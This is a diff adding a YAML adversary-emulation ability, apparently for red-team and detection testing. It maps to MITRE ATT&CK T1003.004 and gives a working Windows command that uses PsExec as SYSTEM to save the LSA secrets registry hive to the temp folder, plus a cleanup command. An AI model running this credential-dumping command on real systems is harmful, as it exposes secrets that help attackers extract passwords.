@@ -1,0 +1,24 @@
+---
+- id: 94e2638b0b5dc476f919b50ff899a382
+  name: Dumping LSA Secrets
+  description: 'Dump secrets key from Windows registry
+
+    When successful, the dumped file will be written to $env:Temp\secrets.
+
+    Attackers may use the secrets key to assist with extracting passwords and enumerating
+    other sensitive system information.
+
+    https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/#:~:text=LSA%20Secrets%20is%20a%20registry,host%2C%20local%20security%20policy%20etc.
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1003.004
+    name: 'OS Credential Dumping: LSA Secrets'
+  platforms:
+    windows:
+      cmd:
+        command: '"PathToAtomicsFolder\..\ExternalPayloads\T1003.004\bin\PsExec.exe"
+          -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets /y'
+        payloads: []
+        cleanup: del %temp%\secrets >nul 2> nul
